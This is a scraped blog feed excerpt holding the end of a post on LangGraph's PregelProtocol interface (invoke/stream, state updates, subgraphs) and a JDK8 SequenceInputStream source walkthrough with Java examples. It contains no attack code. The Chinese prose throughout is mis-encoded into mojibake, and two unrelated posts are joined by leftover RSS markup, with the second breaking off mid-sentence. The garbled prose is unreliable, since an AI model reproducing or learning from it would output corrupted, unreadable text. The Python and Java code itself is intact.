<h2 id="4-ä¸¤ç§è°ç¨æ¹å¼">4. ä¸¤ç§è°ç¨æ¹å¼</h2>
<p>PregelProtocolç<code>invoke/ainvoke</code>å<code>stream/astream</code>æ¹æ³ä½ç°äºéå¯¹ âLangGraph æ§è¡ä½â ä¸¤ç§è°ç¨æ¹å¼ãåèéç¨ç®åçè¯·æ±/åå¤æ¶æ¯äº¤æ¢æ¨¡å¼ï¼å®¢æ·ç«¯éè¦ç­æ´ä¸ªæµç¨ç»æä¹åéç¨å¾å°ç»æãå¦ææ´ä¸ªå¤çæµç¨æ¯è¾å¤æï¼æèæ¶åä¸äºèæ¶çæä½ï¼è¿é¿çç­å¾ä¼å¸¦æ¥ç³ç³çä½éªãåèéç¨æµå¼å¤çä½¿å®¢æ·ç«¯å¯ä»¥å®æ½å¾å°å¤ççä¸­é´ç»ææèæç¥å°å¤ççè¿åº¦ãæä»¬å°å¨åç»­é¨åå¯¹æµå¼å¤çè¿è¡åç¬ä»ç»ã</p>
<pre><code class="language-python">class PregelProtocol(Runnable[InputT, Any], Generic[StateT, ContextT, InputT, OutputT]):
    @abstractmethod
    def stream(
        self,
        input: InputT | Command | None,
        config: RunnableConfig | None = None,
        *,
        context: ContextT | None = None,
        stream_mode: StreamMode | list[StreamMode] | None = None,
        interrupt_before: All | Sequence[str] | None = None,
        interrupt_after: All | Sequence[str] | None = None,
        subgraphs: bool = False,
    ) -&gt; Iterator[dict[str, Any] | Any]: ...

    @abstractmethod
    def astream(
        self,
        input: InputT | Command | None,
        config: RunnableConfig | None = None,
        *,
        context: ContextT | None = None,
        stream_mode: StreamMode | list[StreamMode] | None = None,
        interrupt_before: All | Sequence[str] | None = None,
        interrupt_after: All | Sequence[str] | None = None,
        subgraphs: bool = False,
    ) -&gt; AsyncIterator[dict[str, Any] | Any]: ...

    @abstractmethod
    def invoke(
        self,
        input: InputT | Command | None,
        config: RunnableConfig | None = None,
        *,
        context: ContextT | None = None,
        interrupt_before: All | Sequence[str] | None = None,
        interrupt_after: All | Sequence[str] | None = None,
    ) -&gt; dict[str, Any] | Any: ...

    @abstractmethod
    async def ainvoke(
        self,
        input: InputT | Command | None,
        config: RunnableConfig | None = None,
        *,
        context: ContextT | None = None,
        interrupt_before: All | Sequence[str] | None = None,
        interrupt_after: All | Sequence[str] | None = None,
    ) -&gt; dict[str, Any] | Any: ...
</code></pre>
<p>æ§è¡ä½æ¯æä¸­æ­/æ¢å¤ï¼interrupt/resumeï¼çæ¹å¼æ§è¡ï¼æä»¥å¨ä¸­æ­æ¶éè¦å°å½æ¶çç¶æä»¥ âCheckpointï¼Checkpointï¼â çå½¢å¼ä¿å­ä¸æ¥ï¼æ¢å¤æ§è¡çæ¶åå©ç¨å®ä»¬å°å½æ¶ç âæ§è¡çº¿ç¨â å¤åãCheckpointingçæºå¶ä¹ä½¿ âæ¶é´æè¡â æä¸ºå¯è½ï¼æä»¬å¯ä»¥ä»ä»»ä¸Checkpointå¼å§æ§è¡ãä¹æ­£æ¯å ä¸ºæ­¤æä¹åæºå¶çå­å¨ï¼æä»¬å¯ä»¥æåæä¸ä¸ªSuperstepçç¶æï¼è¿å¯ä»¥æ¥çæ´ä¸ªæ§è¡åå²ï¼è¿ä¸¤ä¸ªåè½åå«å¯¹åºPregelProtocolç<code>get_state/aget_state</code>å<code>get_state_history/aget_state_history</code>æ¹æ³ãå·ä½çç¶æä»¥StateSnapshotå¯¹è±¡æè¿°çå¿«ç§è¡¨ç¤ºã</p>
<p>æ§è¡ä½åºè¯¥å·æå°æ§è¡ç»æä½ä¸ºæ°çç¶æè¿è¡ä¿å­çè½åï¼æä»¥PregelProtocolå®ä¹äº<code>update_state/aupdate_state</code>å<code>bulk_update_state/abulk_update_state</code>æ¹æ³ï¼åèä¿å­åä¸ç¶ææ´æ°ï¼åèå¯¹å¤ä¸ªç¶ææ´æ°è¿è¡æ¹éæ§è¡ãåä¸ç¶ææ´æ°éè¿å¦ä¸è¿ä¸ªåä¸ºStateUpdateçå½ååç»è¡¨ç¤ºï¼æä»¬ä¸ä»å¯ä»¥å©ç¨valueså­æ®µå¾å°ä»¥å­å¸å½¢å¼è¡¨ç¤ºçç¶æå¼ï¼è¿å¯ä»¥éè¿<code>as_node</code>å<code>task_id</code>å­æ®µçå¾å°å®æ½æ´æ°çNodeåå·ä½ä»»å¡æ è¯ã</p>
<pre><code class="language-python">class StateUpdate(NamedTuple):
    values: dict[str, Any] | None
    as_node: str | None = None
    task_id: str | None = None
</code></pre>
<p>æ§è¡ä½æ¯æä¸¤ç§åºæ¬çæä½ï¼ä¸ç§éç¨åçº¯çè¯·æ±/ååºæ¶æ¯äº¤æ¢æ¨¡å¼ï¼å¦ä¸ç§ä»¥æµçå½¢å¼å®æ¶è¿åæ°æ®ï¼å®ä»¬åå«å¯¹åº<code>invoke/ainvoke</code>å<code>stream/astream</code>æ¹æ³ã</p>
<h2 id="5-åµå¥ç»æ">5. åµå¥ç»æ</h2>
<p>æä»¬ä¸ç´å¨å¼ºè°å¾çâåµå¥âç»æï¼è¿ç§ç»æä¹å¯ä»¥ä»PregelãPregelNodeåPregelProtocolå¨ä¸ä¸ªç±»åçå®ä¹ãä¸ä¸ªPregelæ¯PregelProtocolçå®ç°ãä½ä¸ºå¶èç¹çPregelNodeå¯¹è±¡å¯ä»¥ç±ä¸ä¸ªæèå¤ä¸ªPregelProtocolç»æï¼å¯¹äºè¡¨ç¤º âå­å¾â çsubgraphså­æ®µï¼å¹¶ä¸è¯¥å­æ®µè¿åä¸ä¸ªPregelProtocolå¯¹è±¡çåºåãPregelçsubgraphsæ¹æ³è¿åçå­å¾å°±æ¥æºäºç»æå®çNodeã</p>
<pre><code class="language-python">class PregelNode:
    subgraphs	: Sequence[PregelProtocol]

class Pregel(
    PregelProtocol[StateT, ContextT, InputT, OutputT],
    Generic[StateT, ContextT, InputT, OutputT]):
    def get_subgraphs(
        self, *, namespace: str | None = None, recurse: bool = False
    ) -&gt; Iterator[tuple[str, PregelProtocol]]

    async def aget_subgraphs(
        self, *, namespace: str | None = None, recurse: bool = False
    ) -&gt; AsyncIterator[tuple[str, PregelProtocol]]
</code></pre>
<p>PregelNodeçsubgraphså­æ®µæä¾äº âå­å¾â çéææ³¨åï¼å¶å®ä»»ä½ä¸ä¸ªPregelå¯¹è±¡é½å¯ä»¥å¨æ éæ³¨ååæä¸è¢«å¦ä¸ä¸ªPregelçNodeè°ç¨ï¼èä¸åæ å½åæ§è¡ä¸ä¸æçä¸äºæ§è¡éç½®ä¼éè¿ä¸ä¸æåéï¼ContenxtVarsï¼ âæµåâ ä½ä¸ºå­å¾çPregelå¯¹è±¡ãåé¢æä»¬æ¼ç¤ºå­å¾è°ç¨æ¶åçCheckpointå½åç©ºé´çä¾å­å·²ç»ååä½ç°äºè¿ä¸ç¹ãä½æ¯è¿ç§æ¾å¼çéæå£°æå¯¹äºå¾çéæå¾åæä¸å¯è§åæçç§¯æçä½ç¨ã</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-16 07:22">2026-02-16 07:22</span>&nbsp;
<a href="https://www.cnblogs.com/jaydenai">JaydenAI</a>&nbsp;
éè¯»(<span id="post_view_count">12</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19619278);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19619278', targetLink: 'https://www.cnblogs.com/jaydenai/p/19619278/pregel-protocol', title: '[æè§£LangChainæ§è¡å¼æ] PregelProtocolââå®ä¹äº&amp;quot;LangChainæ§è¡ä½&amp;quot;æå°åè½é' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 8ãSequenceInputStreamçæºç åVector.classçä¸äºå½æ°è¯´æï¼windowsæä½ç³»ç»ï¼JDK8ï¼ ]]></title>
    <link>https://www.cnblogs.com/Carey-ccl/p/19618752</link>
    <guid>4887b9c934c445678a4dcf4c4f3af973</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Carey-ccl/p/19618752" title="åå¸äº 2026-02-15 22:25">
    <span role="heading" aria-level="2">8ãSequenceInputStreamçæºç åVector.classçä¸äºå½æ°è¯´æï¼windowsæä½ç³»ç»ï¼JDK8ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h4 id="ä¸sequenceinputstreamæºç å¯ä»¥é¡ºåºè¯»åå¤ä¸ªè¾å¥streamçè£é¥°å¨ç±»">ä¸ãSequenceInputStreamæºç ââå¯ä»¥é¡ºåºè¯»åå¤ä¸ªè¾å¥Streamçè£é¥°å¨ç±»</h4>
<p>ââSequenceInputStream.class çUMLå³ç³»å¾ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215215854830-1271542137.png" class="lazyload"></p>
<p>ââSequenceInputStream.classçæºç ï¼å¦ä¸æç¤ºï¼</p>
<pre><code>package java.io;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.Vector;

public
class SequenceInputStream extends InputStream {
    //é¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéåï¼ä¸è¬æ¯Vectorå®ä¾
    Enumeration&lt;? extends InputStream&gt; e;
    InputStream in;//é¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéåä¸­å½åæ­£å¨è¢«SequenceInputStream å¯¹è±¡ä½¿ç¨çè¢«è£é¥°çè¾å¥Stream
    
    //æé å½æ°ï¼ä¼ å¥ä¸ä¸ªé¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéå
    public SequenceInputStream(Enumeration&lt;? extends InputStream&gt; e) {
        this.e = e;
        try {
            nextStream();
        } catch (IOException ex) {
            // This should never happen
            throw new Error("panic");
        }
    }
    
    //æé å½æ°ï¼å¯ä»¥å°2ä¸ªè¢«è£é¥°çè¾å¥Streamæ¾å¥å°éåä¸­
    public SequenceInputStream(InputStream s1, InputStream s2) {
        Vector&lt;InputStream&gt; v = new Vector&lt;&gt;(2);

        v.addElement(s1);
        v.addElement(s2);
        e = v.elements();
        try {
            nextStream();
        } catch (IOException ex) {
            // This should never happen
            throw new Error("panic");
        }
    }
    //è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
    final void nextStream() throws IOException {
        if (in != null) {
            in.close();//åå³é­å½åè¢«è£é¥°çè¾å¥Stream
        }

        if (e.hasMoreElements()) {//å¦æéåä¸­è¿æè¢«è£é¥°çè¾å¥Stream
            in = (InputStream) e.nextElement();//è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
            if (in == null)
                throw new NullPointerException();//å¦æéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Streamä¸ºnullï¼æåºä¸ä¸ªNullPointerException
        }
        else in = null;//å¦æéåä¸­æ²¡æäºè¢«è£é¥°çè¾å¥Streamï¼å°å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamç½®ä¸ºnull

    }
    
    //å¤æ­å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamæ¯å¦è¿æå¯ä»¥è¯»åçå­èæ°æ®
    public int available() throws IOException {
        if (in == null) {
            return 0; // no way to signal EOF from available()
        }
        return in.available();
    }
    
    //ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çå¤ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»å1ä¸ªå­è
    public int read() throws IOException {
        while (in != null) {//å¦æin!=nullï¼åè¯´æå½åè¿ä¸ªSequenceInputStream å¯¹è±¡çéåä¸­è¿æè¢«è£é¥°çè¾å¥Streamæ²¡æå³é­
            int c = in.read();//ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¢«è£é¥°è¾å¥Streamä¸­è¯»å1ä¸ªå­è
            if (c != -1) {//c != -1è¯´æä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°è¾å¥Streamä¸­è¯»åå°äºå­è
                return c;//è¿åè¯»åå°çè¿ä¸ªå­è
            }
            nextStream();//å¦æc==-1è¯´æå½åæ­£å¨ä½¿ç¨çè¢«è£é¥°è¾å¥Streamä¸­å­èï¼byteï¼æ°æ®å·²ç»è¯»å®ï¼è·åSequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
        }
        return -1;//å¦æSequenceInputStream å¯¹è±¡çéåä¸­ææè¢«è£é¥°çè¾å¥Streamä¸­çå­èï¼byteï¼æ°æ®é½å·²ç»è¯»å®ï¼è¿å-1
    }

    //ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çå¤ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»ålenä¸ªå­èï¼æ¾å¥å°byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼ç´¢å¼ä½ç½®
    public int read(byte b[], int off, int len) throws IOException {
        if (in == null) {//å¦æin==nullï¼åè¯´æå½åè¿ä¸ªSequenceInputStream å¯¹è±¡çéåä¸­ææè¢«è£é¥°çè¾å¥Streamé½å·²ç»å³é­
            return -1;
        } else if (b == null) {
            throw new NullPointerException();//å¦æbyte[]æ°ç»b==nullï¼æåºä¸ä¸ªNullPointerException
        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//ç¸å½äºoff + len &gt; b.lengthï¼æºç ä¸­è¿æ ·åä»£ç çå¥½å¤ææ²¡çåºæ¥ï¼
            throw new IndexOutOfBoundsException();
        } else if (len == 0) {
            return 0;//è¦ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çè³å°2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»åçlenä¸ªå­è==0æ¶ï¼è¿å0
        }
        do {
            int n = in.read(b, off, len);//ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­è¯»ålenä¸ªå­èï¼æ¾å¥å°byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼ç´¢å¼ä½ç½®
            if (n &gt; 0) {
                return n;//åªè¦è½ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­è¯»åå°å­èï¼åè¿åè¯»åçæ°é
            }
            nextStream();//æ­¤æ¶n==-1ï¼è¯´æå½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­å­èï¼byteï¼æ°æ®å·²ç»è¯»å®ï¼è·åSequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
        } while (in != null);//SequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Streamä¸ºnullæ¶ï¼è·³åºå¾ªç¯ï¼è¿å-1
        return -1;
    }
    //é¡ºåºå³é­SequenceInputStream å¯¹è±¡çéåä¸­ææè¢«è£é¥°çè¾å¥Stream
    public void close() throws IOException {
        do {
            nextStream();
        } while (in != null);
    }
}
</code></pre>
<h5 id="11sequenceinputstreamçreadå½æ°ånextstreamå½æ°">1.1ãSequenceInputStreamçread()å½æ°ånextStream()å½æ°</h5>
<pre><code>package java.io;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.Vector;

public
class SequenceInputStream extends InputStream {
    ...çç¥é¨åä»£ç ...
    //é¡ºåºï¼åºååï¼å­å¨å¤ä¸ªè¢«è£é¥°çè¾å¥Streamçéåï¼ä¸è¬æ¯Vectorå®ä¾
    Enumeration&lt;? extends InputStream&gt; e;
    InputStream in;//é¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéåä¸­å½åæ­£å¨è¢«SequenceInputStream å¯¹è±¡ä½¿ç¨çè¢«è£é¥°çè¾å¥Stream
    //è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
    final void nextStream() throws IOException {
        if (in != null) {
            in.close();//åå³é­å½åè¢«è£é¥°çè¾å¥Stream
        }

        if (e.hasMoreElements()) {//å¦æéåä¸­è¿æè¢«è£é¥°çè¾å¥Stream
            in = (InputStream) e.nextElement();//è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
            if (in == null)
                throw new NullPointerException();//å¦æéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Streamä¸ºnullï¼æåºä¸ä¸ªNullPointerException
        }
        else in = null;//å¦æéåä¸­æ²¡æäºè¢«è£é¥°çè¾å¥Streamï¼å°å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamç½®ä¸ºnull

    }
    
    //ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çå¤ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»å1ä¸ªå­è
    public int read() throws IOException {
        while (in != null) {//å¦æin!=nullï¼åè¯´æå½åè¿ä¸ªSequenceInputStream å¯¹è±¡çéåä¸­è¿æè¢«è£é¥°çè¾å¥Streamæ²¡æå³é­
            int c = in.read();//ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¢«è£é¥°è¾å¥Streamä¸­è¯»å1ä¸ªå­è
            if (c != -1) {//c != -1è¯´æä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°è¾å¥Streamä¸­è¯»åå°äºå­è
                return c;//è¿åè¯»åå°çè¿ä¸ªå­è
            }
            nextStream();//å¦æc==-1è¯´æå½åæ­£å¨ä½¿ç¨çè¢«è£é¥°è¾å¥Streamä¸­å­èï¼byteï¼æ°æ®å·²ç»è¯»å®ï¼è·åSequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
        }
        return -1;//å¦æSequenceInputStream å¯¹è±¡çéåä¸­ææè¢«è£é¥°çè¾å¥Streamä¸­çå­èï¼byteï¼æ°æ®é½å·²ç»è¯»å®ï¼è¿å-1
    }
    ...çç¥é¨åä»£ç ...
}
</code></pre>
<p>å¦æä½¿ç¨èç¨çæ¯2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ï¼æé çSequenceInputStreamçå¯¹è±¡ï¼å¦ä¸æç¤ºï¼ä¼ªä»£ç ï¼ï¼</p>
<pre><code>is1 = new FileInputStream("D:\\data1.txt");
is2 = new FileInputStream("D:\\data2.txt");
sequenceInputStream = new SequenceInputStream(is1, is2);
</code></pre>
<p>é£ä¹ï¼SequenceInputStreamå¯¹è±¡ä¸­Vectoréåçå®¹éæ¯2ï¼å¦ææ­¤æ¶æ§è¡SequenceInputStream.class::read()å½æ°ã</p>
<pre><code>//ä¼ªä»£ç 
int readByte = -1;
while ((readByte = sequenceInputStream.read()) != -1) {
   System.out.print((char) readByte);
}
</code></pre>
<p>è¿ç¨å¦ä¸ï¼åè®¾2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ä¸­çå­èæ°æ®å¦ä¸ï¼ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220043218-349583290.png" class="lazyload"></p>
<p>â ãåæ§è¡ç¬¬1ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¹æ¯Vectoréåçç¬¬1ä¸ªåç´ ï¼çread()å½æ°ï¼ç´å°è¯¥å½æ°è¿å-1ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220100324-1139361487.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220109951-490306412.png" class="lazyload"></p>
<p>â¡ãå³é­ç¬¬1ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¹æ¯Vectoréåçç¬¬1ä¸ªåç´ ï¼ï¼åæ§è¡ç¬¬2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¹æ¯Vectoréåçç¬¬2ä¸ªåç´ ï¼çread()å½æ°ï¼ç´å°è¯¥å½æ°è¿å-1ï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220126547-1754735555.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220135740-592304804.png" class="lazyload"></p>
<h6 id="111ä½¿ç¨ä¸¾ä¾">1.1.1ãä½¿ç¨ä¸¾ä¾</h6>
<p>ââä¸é¢è¿ä¸ªä¾å­å°±æ°å½çä½¿ç¨SequenceInputStreamçread()å½æ°ï¼</p>
<ul>
<li>
<p>æçwindowsæä½ç³»ç»çDçæ ¹ç®å½ä¸æ2ä¸ªtxtæä»¶ï¼ä¸ä¸ªæ¯data1.txtï¼å¦ä¸ä¸ªæ¯data2.txtæä»¶ï¼è¿2ä¸ªæä»¶ä¸­æ»å±æ30ä¸ªå­èï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220203616-2107974847.png" class="lazyload"><br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220213513-1764667319.png" class="lazyload"></p>
</li>
<li>
<p>ä½¿ç¨èå¯ä»¥ç¨ä¸ä¸ªSequenceInputStreamå¯¹è±¡è£é¥°2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ï¼å¦ä¸ä»£ç æç¤ºï¼</p>
</li>
</ul>
<pre><code>package com.chelong.StreamAndReader;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.SequenceInputStream;

public class SequenceInputStreamTest {
   public static void main(String[] args) {
      InputStream is1 = null;
      InputStream is2 = null;
      SequenceInputStream sequenceInputStream = null;
      try {
         is1 = new FileInputStream("D:\\data1.txt");
         is2 = new FileInputStream("D:\\data2.txt");
         sequenceInputStream = new SequenceInputStream(is1, is2);
         int readByte = -1;
         while ((readByte = sequenceInputStream.read()) != -1) {
            System.out.print((char) readByte);
         }
      } catch (IOException e) {
         e.printStackTrace();
      } finally {
          //æ­¤å¤çç¥å³é­ææçStreamçä»£ç 
      }
   }
}
</code></pre>
<p>ç¨åºè¿è¡ç»æï¼å¦ä¸æç¤ºï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220259069-1799250009.png" class="lazyload"></p>
<h5 id="12sequenceinputstreamçreadbyte-b-int-off-int-lenå½æ°ånextstreamå½æ°">1.2ãSequenceInputStreamçread(byte b[], int off, int len)å½æ°ånextStream()å½æ°</h5>
<pre><code>package java.io;
import java.io.InputStream;
import java.util.Enumeration;
import java.util.Vector;

public
class SequenceInputStream extends InputStream {
    ...çç¥é¨åä»£ç ...
    //é¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéåï¼ä¸è¬æ¯Vectorå®ä¾
    Enumeration&lt;? extends InputStream&gt; e;
    InputStream in;//é¡ºåºï¼åºååï¼è£è½½å¤ä¸ªè¢«è£é¥°è¾å¥Streamçéåä¸­å½åæ­£å¨è¢«SequenceInputStream å¯¹è±¡ä½¿ç¨çè¢«è£é¥°çè¾å¥Stream
    //è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
    final void nextStream() throws IOException {
        if (in != null) {
            in.close();//åå³é­å½åè¢«è£é¥°çè¾å¥Stream
        }

        if (e.hasMoreElements()) {//å¦æéåä¸­è¿æè¢«è£é¥°çè¾å¥Stream
            in = (InputStream) e.nextElement();//è·åéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
            if (in == null)
                throw new NullPointerException();//å¦æéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Streamä¸ºnullï¼æåºä¸ä¸ªNullPointerException
        }
        else in = null;//å¦æéåä¸­æ²¡æäºè¢«è£é¥°çè¾å¥Streamï¼å°å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamç½®ä¸ºnull

    }
    
    //ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çå¤ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»ålenä¸ªå­èï¼æ¾å¥å°byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼ç´¢å¼ä½ç½®
    public int read(byte b[], int off, int len) throws IOException {
        if (in == null) {//å¦æin==nullï¼åè¯´æå½åè¿ä¸ªSequenceInputStream å¯¹è±¡çéåä¸­ææè¢«è£é¥°çè¾å¥Streamé½å·²ç»å³é­
            return -1;
        } else if (b == null) {
            throw new NullPointerException();//å¦æbyte[]æ°ç»b==nullï¼æåºä¸ä¸ªNullPointerException
        } else if (off &lt; 0 || len &lt; 0 || len &gt; b.length - off) {//ç¸å½äºoff + len &gt; b.lengthï¼æºç ä¸­è¿æ ·åä»£ç çå¥½å¤ææ²¡çåºæ¥ï¼
            throw new IndexOutOfBoundsException();
        } else if (len == 0) {
            return 0;//è¦ä»SequenceInputStream å¯¹è±¡çéåï¼è¯¥éåæ¾çè³å°2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼ä¸­è¯»åçlenä¸ªå­è==0æ¶ï¼è¿å0
        }
        do {
            int n = in.read(b, off, len);//ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­è¯»ålenä¸ªå­èï¼æ¾å¥å°byte[]æ°ç»bç[off,off+len)ï¼å·¦é­å³å¼ï¼ä¸åæ¬off+lenï¼ç´¢å¼ä½ç½®
            if (n &gt; 0) {
                return n;//åªè¦è½ä»å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­è¯»åå°å­èï¼åè¿åè¯»åçæ°é
            }
            nextStream();//æ­¤æ¶n==-1ï¼è¯´æå½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­å­èï¼byteï¼æ°æ®å·²ç»è¯»å®ï¼è·åSequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Stream
        } while (in != null);//SequenceInputStream å¯¹è±¡çéåä¸­ä¸ä¸ä¸ªè¢«è£é¥°çè¾å¥Streamä¸ºnullæ¶ï¼è·³åºå¾ªç¯ï¼è¿å-1
        return -1;
    }
    ...çç¥é¨åä»£ç ...
}
</code></pre>
<p>å¦æä½¿ç¨èç¨çæ¯2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ï¼æé çSequenceInputStreamçå¯¹è±¡ï¼å¦ä¸æç¤ºï¼ä¼ªä»£ç ï¼ï¼</p>
<pre><code>is1 = new FileInputStream("D:\\data1.txt");
is2 = new FileInputStream("D:\\data2.txt");
sequenceInputStream = new SequenceInputStream(is1, is2);
</code></pre>
<p>é£ä¹ï¼SequenceInputStreamå¯¹è±¡ä¸­Vectoréåçå®¹éæ¯2ï¼å¹¶ä¸åè®¾è¿2ä¸ªè¢«è£é¥°çè¾å¥Streamï¼æ­¤å¤ä¸ºFileInputStreamï¼ä¸­çå­èæ°æ®å¦ä¸ï¼<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220336936-422574713.png" class="lazyload"></p>
<p>å¦ææ­¤æ¶æ§è¡SequenceInputStream.class::read()å½æ°ãæ¥ä¸æ¥ä½¿ç¨SequenceInputStreamå¯¹è±¡è¯»åå­èæ°æ®å°ä½¿ç¨èåå»ºçbyte[]æ°ç»ï¼å¦æä½¿ç¨èåå»ºçå­èæ°ç»byte[]çé¿åº¦&gt;=ç¬¬1ä¸ªè¢«è£é¥°çè¾å¥Streamä¸­çææå­èä¸ªæ°ï¼æ¯å¦ï¼ä½¿ç¨èåå»ºçbyte[]æ°ç»çé¿åº¦ä¸º12ï¼å¦ä¸æç¤ºï¼ä¼ªä»£ç ï¼ï¼</p>
<pre><code>int readByte = -1;
byte[] buff = new byte[12];
while ((readByte = sequenceInputStream.read(buff, 0, buff.length)) != -1) {
   for (int i = 0; i &lt; readByte; i++) {
      System.out.print((char) buff[i]);
   }
}
</code></pre>
<p>æ´ä¸ªæ§è¡è¿ç¨å¦ä¸ï¼<br>
â ãç¬¬1æ¬¡è¿å¥read()å½æ°<br>
<img alt="clipboard" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2485827/202602/2485827-20260215220358799-222018244.png" class="lazyload"></p>
<p>â¡ãç¬¬2æ¬¡è¿å¥read()å½æ°ï¼<em><strong>éç¹æ¯å½åæ­£å¨ä½¿ç¨çè¢«è£é¥°çè¾å¥Streamä¸­çå­èæ°æ®å·²ç»è¯»åå®äºæ¶ï¼åæ¬¡è¯»åï¼ä¼è¿å-1ï¼ä¸ä¼è¿å0</strong></em>ï¼<br>
